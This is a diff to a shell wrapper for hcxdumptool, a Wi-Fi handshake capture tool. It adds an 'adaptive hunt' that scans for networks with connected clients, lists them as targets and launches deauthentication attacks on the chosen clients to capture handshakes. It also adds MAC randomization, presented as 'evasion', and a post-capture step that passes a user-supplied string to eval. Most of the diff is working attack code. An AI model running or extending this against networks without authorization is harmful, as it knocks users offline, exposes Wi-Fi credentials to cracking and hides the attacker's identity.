@@ -49,6 +49,11 @@ RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m';
 BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'
 
 #--- Default Settings ---#
+POST_JOB_CMD=""
+ADAPTIVE_HUNT=0
+RANDOMIZE_MAC=0
+ORIGINAL_MAC=""
+SESSION_TAG=""
 INTERFACE=""
 CHANNELS=""
 DURATION=""
@@ -164,6 +169,7 @@ usage() {
     echo "  -c, --channels <ch>      Set specific channels to scan (e.g., '1,6,11'). Default: All."
     echo "  -d, --duration <secs>    Set the total capture duration in seconds. (Default: unlimited)"
     echo "  -o, --output-dir <path>  Directory to save capture files. Default: /root/hcxdumps."
+    echo "  --tag <name>             Assign a session tag to the capture filename (e.g., 'MyCafe')."
     echo "  --stay-time <ms>         Time in milliseconds to stay on each channel."
     echo "  --enable-gps             Enable gpsd for logging location data to pcapng file."
     echo
@@ -175,7 +181,8 @@ usage() {
     echo "  --oui-filter-mode <mode> Mode for --oui-file (whitelist|blacklist). Default: blacklist."
     echo
     echo -e "${GREEN}Attack & Capture Modes:${NC}"
-    echo "  --hunt-handshakes        Actively deauthenticate to capture handshakes (hcxdumptool)."
+    echo "  --hunt-handshakes        Actively deauthenticate all clients on a network."
+    echo "  --hunt-adaptive          Run a smart hunt that targets only specific, active clients."
     echo "  --passive                Run in a strictly passive mode, no deauthentication."
     echo "  --survey                 Perform a network survey without saving capture files."
     echo "  --client-only-hunt       Stealthily capture client handshakes without AP association (hcxlabtool)."
@@ -187,6 +194,12 @@ usage() {
     echo
     echo -e "${GREEN}Advanced Control:${NC}"
     echo "  --hcxd-opts \"<opts>\"     Pass additional, quoted options directly to the backend tool."
+    echo
+    echo -e "${GREEN}Evasion & Anonymity:${NC}"
+    echo "  --random-mac           Use a random MAC address on the capture interface."
+    echo
+    echo -e "${GREEN}Workflow Automation:${NC}"
+    echo "  --post-job \"<args>\"   Automatically run hcx-analyzer with the specified arguments after capture."
     echo
     if [ "$FULL_HELP" -eq 1 ]; then
         show_full_help
@@ -690,9 +703,27 @@ pre_flight_checks() {
             fi
         fi
     fi
-    
+
     if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
         echo -e "${RED}Error: Interface '$INTERFACE' not found.${NC}" >&2; exit 1
+    fi
+
+    # --- MAC Randomization Logic ---
+    if [ "$RANDOMIZE_MAC" -eq 1 ]; then
+        if ! command -v macchanger >/dev/null 2>&1; then
+            echo -e "${RED}Error: --random-mac requires 'macchanger', but it is not installed.${NC}" >&2
+            echo -e "${YELLOW}Please install it (e.g., 'opkg install macchanger') and try again.${NC}" >&2
+            exit 1
+        fi
+        echo -e "${CYAN}Randomizing MAC address for '$INTERFACE'...${NC}"
+        ip link set "$INTERFACE" down
+        # Store the original MAC address for later restoration
+        ORIGINAL_MAC=$(macchanger -s "$INTERFACE" | awk '/Permanent MAC:/ {print $3}')
+        if [ -z "$ORIGINAL_MAC" ]; then
+             echo -e "${RED}Error: Could not determine permanent MAC address. Aborting.${NC}" >&2
+             exit 1
+        fi
+        macchanger -r "$INTERFACE"
     fi
     
     echo -e "${CYAN}Setting interface '$INTERFACE' to managed mode...${NC}"
@@ -791,11 +822,41 @@ cleanup() {
     
     if [ "$SURVEY_MODE" -ne 1 ]; then
         echo -e "\n${GREEN}Capture complete!${NC}"
-        echo -e "  - Run '${CYAN}hcx-analyzer.sh${NC}' to perform a full analysis."
+
+        # --- Post-Job Execution Logic ---
+        if [ -n "$POST_JOB_CMD" ]; then
+            printf "\n%b\n" "${CYAN}--- ⚙️ Executing Post-Capture Job ---${NC}"
+            local ANALYZER_CMD="$ANALYZER_BIN"
+
+            # Automatically append the session tag if it was used for the capture
+            if [ -n "$SESSION_TAG" ]; then
+                local sanitized_tag
+                sanitized_tag=$(echo "$SESSION_TAG" | tr -cd '[:alnum:]_-')
+                ANALYZER_CMD="$ANALYZER_CMD --tag '$sanitized_tag'"
+            fi
+            
+            # Add the user-defined commands
+            ANALYZER_CMD="$ANALYZER_CMD $POST_JOB_CMD"
+            
+            printf "Running command: %s\n" "$ANALYZER_CMD"
+            printf "%b\n" "${BLUE}--------------------------------------${NC}"
+            # Use eval to correctly handle arguments within the quoted string
+            eval "$ANALYZER_CMD"
+            printf "%b\n" "${BLUE}--------------------------------------${NC}"
+        else
+             echo -e "  - Run '${CYAN}hcx-analyzer.sh${NC}' to perform a full analysis."
+        fi
+    fi
+
+    # --- MAC Restoration Logic ---
+    if [ "$RANDOMIZE_MAC" -eq 1 ] && [ -n "$ORIGINAL_MAC" ]; then
+        echo -e "${CYAN}Restoring original MAC address ($ORIGINAL_MAC) to '$INTERFACE'...${NC}"
+        ip link set "$INTERFACE" down 2>/dev/null
+        macchanger -p "$INTERFACE" >/dev/null 2>&1
     fi
 
     if [ "$RESTORE_INTERFACE" -eq 1 ]; then
-        echo -e "${CYAN}Restoring interface '$INTERFACE' to managed mode...${NC}"
+        echo -e "${CYAN}Setting interface '$INTERFACE' to managed mode...${NC}"
         ip link set "$INTERFACE" down 2>/dev/null
         iw "$INTERFACE" set type managed 2>/dev/null
         ip link set "$INTERFACE" up 2>/dev/null
@@ -834,16 +895,137 @@ interactive_mode() {
     read -r -p "Enter capture duration in seconds (leave empty for no limit): " DURATION
 }
 
+run_adaptive_hunt() {
+    printf "\n%b\n" "${BLUE}--- ⚔️ Starting Adaptive Deauthentication Hunt ---${NC}"
+    local survey_duration=30 # Scan for clients for 30 seconds
+    local TEMP_DIR="/tmp/adaptive_hunt_$$"
+    mkdir -p "$TEMP_DIR"
+    # Set a trap to ensure temporary files are cleaned up on exit
+    trap 'rm -rf "$TEMP_DIR"; trap - INT TERM EXIT' INT TERM EXIT
+
+    local TEMP_SCAN_FILE="$TEMP_DIR/scan_results.txt"
+    local TARGET_LIST_FILE="$TEMP_DIR/targets.txt"
+
+    # --- Step 1: Survey for active clients ---
+    printf "${CYAN}Scanning for active networks and clients for %s seconds...${NC}\n" "$survey_duration"
+    hcxdumptool -i "$INTERFACE" -F --rcascan=a --rcascan_ouifile=/tmp/rcascan.oui --silent > "$TEMP_SCAN_FILE" 2>&1 &
+    local scan_pid=$!
+    sleep "$survey_duration"
+    kill "$scan_pid" >/dev/null 2>&1
+    wait "$scan_pid" 2>/dev/null
+
+    # --- Step 2: Parse results and present targets ---
+    if [ ! -s "$TEMP_SCAN_FILE" ]; then
+        printf "%b\n" "${RED}No networks or clients were found during the survey.${NC}"
+        return 1
+    fi
+    
+    # Use awk to parse the scan file and build a list of targets
+    awk '
+        /->/ {
+            bssid = $1;
+            essid = $3;
+            channel = $4;
+            client = $6;
+            key = bssid"|"essid"|"channel;
+            clients[key] = clients[key] " " client;
+            count[key]++;
+        }
+        END {
+            for (key in count) {
+                print key "|" count[key] "|" clients[key];
+            }
+        }' "$TEMP_SCAN_FILE" > "$TARGET_LIST_FILE"
+
+    if [ ! -s "$TARGET_LIST_FILE" ]; then
+        printf "%b\n" "${YELLOW}Found networks, but no actively connected clients to target.${NC}"
+        return 1
+    fi
+    
+    printf "\n%b\n" "${CYAN}Please select a target network to attack:${NC}"
+    local menu_line_count
+    menu_line_count=$(wc -l < "$TARGET_LIST_FILE")
+    
+    # Use cat -n to number the lines for the menu
+    cat -n "$TARGET_LIST_FILE" | while IFS="|" read -r num bssid essid channel client_count clients; do
+        printf "  %s) %-18s %-25s (%s client/s)\n" "$(echo "$num" | tr -d ' ')" "$bssid" "$essid" "$client_count"
+    done
+    
+    printf "Enter choice [1-%d]: " "$menu_line_count"
+    read -r choice
+
+    # POSIX-compliant input validation
+    case "$choice" in
+        ''|*[!0-9]*)
+            printf "%b\n" "${RED}Invalid choice. Aborting.${NC}"
+            return 1;;
+    esac
+    if [ "$choice" -lt 1 ] || [ "$choice" -gt "$menu_line_count" ]; then
+        printf "%b\n" "${RED}Invalid choice. Aborting.${NC}"
+        return 1
+    fi
+    
+    # Use sed to retrieve the selected line from the temp file
+    local selected_target
+    selected_target=$(sed -n "${choice}p" "$TARGET_LIST_FILE")
+    local target_bssid
+    target_bssid=$(echo "$selected_target" | cut -d'|' -f1)
+    local target_channel
+    target_channel=$(echo "$selected_target" | cut -d'|' -f3)
+    # Get all clients and format them into a comma-separated list
+    local target_clients
+    target_clients=$(echo "$selected_target" | cut -d'|' -f5 | sed 's/ //g' | tr ' ' ',')
+
+    # --- Step 3: Launch the targeted attack ---
+    local ts
+    ts=$(date +%Y%m%d-%H%M%S)
+    local output_file="${OUTPUT_DIR}/session-adaptive-${ts}.pcapng"
+
+    printf "\n%b\n" "${BLUE}Starting targeted deauth attack on channel ${target_channel}...${NC}"
+    printf "  - BSSID:  %s\n" "$target_bssid"
+    printf "  - CLIENTS: %s\n" "$target_clients"
+    
+    local CAPTURE_CMD="hcxdumptool -i $INTERFACE -w \"$output_file\" -c $target_channel --bssid_essid=$target_bssid --deauth=$target_clients --silent"
+
+    log_message "Executing Adaptive Hunt: $CAPTURE_CMD"
+    echo "$output_file" >> "$TEMP_FILE"
+    eval "$CAPTURE_CMD" &
+    HCX_PID=$!
+
+    if [ -n "$DURATION" ]; then
+        sleep "$DURATION"
+        if kill -0 "$HCX_PID" 2>/dev/null; then kill "$HCX_PID"; fi
+    fi
+    
+    wait "$HCX_PID" 2>/dev/null
+}
+
 run_main_workflow() {
+    if [ "$ADAPTIVE_HUNT" -eq 1 ]; then
+        run_adaptive_hunt
+        return
+    fi
+    
+    # Sanitize the tag to ensure it's safe for filenames
+    local sanitized_tag=""
+    if [ -n "$SESSION_TAG" ]; then
+        sanitized_tag=$(echo "$SESSION_TAG" | tr -cd '[:alnum:]_-')
+    fi
+
     if [ "$WARDRIVING_LOOP" -gt 0 ]; then
-        log_message "Starting Wardriving Loop with ${WARDRIVING_LOOP}s interval."
+        log_message "Starting Wardriving Loop with ${WARDRIVING_LOOP}s interval and tag: '${sanitized_tag}'"
         if [ "$QUIET" -eq 0 ]; then echo -e "${BLUE}--- Starting Wardriving Loop (Interval: ${WARDRIVING_LOOP}s) ---${NC}"; fi
         local loop_count=1
         while true; do
             local ts
             ts=$(date +%Y%m%d-%H%M%S)
-            local loop_output_file="${OUTPUT_DIR}/session-$(date +%Y%m%d)-wardrive-${ts}.pcapng"
-            if [ "$QUIET" -eq 0 ]; then echo -e "\n${YELLOW}Starting loop #$loop_count...${NC}"; fi
+            local filename_base="session"
+            if [ -n "$sanitized_tag" ]; then
+                filename_base="${filename_base}-${sanitized_tag}"
+            fi
+            
+            local loop_output_file="${OUTPUT_DIR}/${filename_base}-wardrive-${ts}.pcapng"
+            if [ "$QUIET" -eq 0 ]; then echo -e "\n${YELLOW}Starting loop #$loop_count... (File: $(basename "$loop_output_file"))${NC}"; fi
             start_capture "$loop_output_file" "$WARDRIVING_LOOP"
             loop_count=$((loop_count + 1))
             if [ "$QUIET" -eq 0 ]; then echo -e "${CYAN}Loop complete. Waiting for next cycle... (Ctrl+C to stop)${NC}"; fi
@@ -851,7 +1033,14 @@ run_main_workflow() {
     else
         local ts
         ts=$(date +%Y%m%d-%H%M%S)
-        local output_file="${OUTPUT_DIR}/session-$(date +%Y%m%d)-single-${ts}.pcapng"
+        local filename_base="session"
+        if [ -n "$sanitized_tag" ]; then
+            filename_base="${filename_base}-${sanitized_tag}"
+        fi
+        
+        local output_file="${OUTPUT_DIR}/${filename_base}-single-${ts}.pcapng"
+        log_message "Starting single capture with tag: '${sanitized_tag}'"
+        echo -e "${BLUE}Starting capture... (File: $(basename "$output_file"))${NC}"
         start_capture "$output_file" "$DURATION"
     fi
 }
@@ -880,10 +1069,12 @@ main() {
             --list-profiles) list_profiles; exit 0;;
             --list-filters) list_filters; exit 0;;
             --profile) load_profile "$2"; shift 2;;
+            --tag) SESSION_TAG="$2"; shift 2;;
             -i|--interface) INTERFACE="$2"; shift 2;;
             -c|--channels) CHANNELS="$2"; shift 2;;
             -d|--duration) DURATION="$2"; shift 2;;
             -o|--output-dir) OUTPUT_DIR="$2"; shift 2;;
+            --random-mac) RANDOMIZE_MAC=1; shift;;
             --bpf) BPF_FILE="$2"; shift 2;;
             --filter-file) FILTER_FILE="$2"; shift 2;;
             --filter-mode)
@@ -898,6 +1089,7 @@ main() {
             --stay-time) STAY_TIME="$2"; shift 2;;
             --wardriving-loop) WARDRIVING_LOOP="$2"; shift 2;;
             --hcxd-opts) HCXD_OPTS="$HCXD_OPTS $2"; shift 2;;
+            --post-job) POST_JOB_CMD="$2"; shift 2;;
             --interactive) INTERACTIVE_MODE=1; shift;;
             --enable-gps) ENABLE_GPS=1; shift;;
             --live-db-log) LIVE_DB_LOG=1; BACKEND="hcxlabtool"; shift;;
@@ -910,6 +1102,7 @@ main() {
                 fi
                 shift 2;;
             --hunt-handshakes) HUNT_HANDSHAKES=1; shift;;
+            --hunt-adaptive) ADAPTIVE_HUNT=1; shift;;
             --passive) PASSIVE_MODE=1; shift;;
             --survey) SURVEY_MODE=1; shift;;
             --client-only-hunt) CLIENT_ONLY_HUNT=1; BACKEND="hcxlabtool"; shift;;
